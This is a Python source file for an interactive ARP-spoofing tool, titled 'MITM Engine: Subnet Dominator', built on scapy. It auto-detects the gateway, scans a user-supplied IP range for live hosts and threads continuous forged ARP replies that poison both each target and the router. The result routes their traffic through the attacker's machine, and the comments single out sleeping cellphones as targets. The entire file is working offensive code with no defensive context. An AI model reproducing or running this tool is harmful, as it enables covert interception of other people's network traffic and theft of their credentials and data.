import os
import time
import threading
import socket
from scapy.all import ARP, sendp, Ether, srp, conf, get_if_list, get_if_addr
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()


class MITMEngine:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interface = ""
        self.gateway_ip = ""
        self.targets = []

    def auto_detect(self):
        """Attempts to find the active interface and gateway IP automatically."""
        try:
            # Get default interface (often en0 on Mac)
            self.interface = conf.iface
            # Get default gateway (requires 'netstat' or Scapy route)
            from scapy.all import conf
            self.gateway_ip = conf.route.route("0.0.0.0")[2]
            return True
        except:
            return False

    def get_mac(self, ip):
        """Resolves MAC address with high-retry for sleeping devices."""
        try:
            # We send multiple packets to 'wake up' mobile devices
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=3, retry=3, verbose=False, iface=self.interface)
            return ans[0][1].hwsrc if ans else None
        except:
            return None

    def poison(self, target_ip, target_mac, gateway_mac):
        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip)
        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not self.stop_event.is_set():
            sendp(target_pkt, verbose=False, iface=self.interface)
            sendp(router_pkt, verbose=False, iface=self.interface)
            time.sleep(2)

    def run(self):
        draw_header("MITM Engine: Subnet Dominator")

        if self.auto_detect():
            console.print(
                f"[bold green][+] Auto-Detected:[/bold green] Interface: [cyan]{self.interface}[/cyan], Gateway: [cyan]{self.gateway_ip}[/cyan]")
            use_auto = console.input(
                "[bold yellow]Use auto-detected settings? (Y/n): [/bold yellow]").lower() != 'n'
            if not use_auto:
                self.interface = console.input("Interface (e.g. en0): ")
                self.gateway_ip = console.input("Gateway IP: ")

        target_input = console.input(
            "[bold yellow]Target IP or Range (e.g. 192.168.1.5): [/bold yellow]")

        gw_mac = self.get_mac(self.gateway_ip)
        if not gw_mac:
            console.print(
                "[bold red][!] Could not resolve Gateway MAC. Use 'netstat -nr' to verify Gateway IP.[/bold red]")
            return

        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                     timeout=2, verbose=False, iface=self.interface)
        self.targets = [(rcv.psrc, rcv.hwsrc)
                        for _, rcv in ans if rcv.psrc != self.gateway_ip]

        if not self.targets:
            console.print(
                "[bold red][!] No active targets found. Cellphones may be asleep.[/bold red]")
            return

        for ip, mac in self.targets:
            threading.Thread(target=self.poison, args=(
                ip, mac, gw_mac), daemon=True).start()

        try:
            console.print(
                "[bold red][!] Interception Active. Ctrl+C to stop.[/bold red]")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_event.set()
            console.print("\n[yellow][*] Cleaning up...[/yellow]")


def start_mitm():
    engine = MITMEngine()
    engine.run()
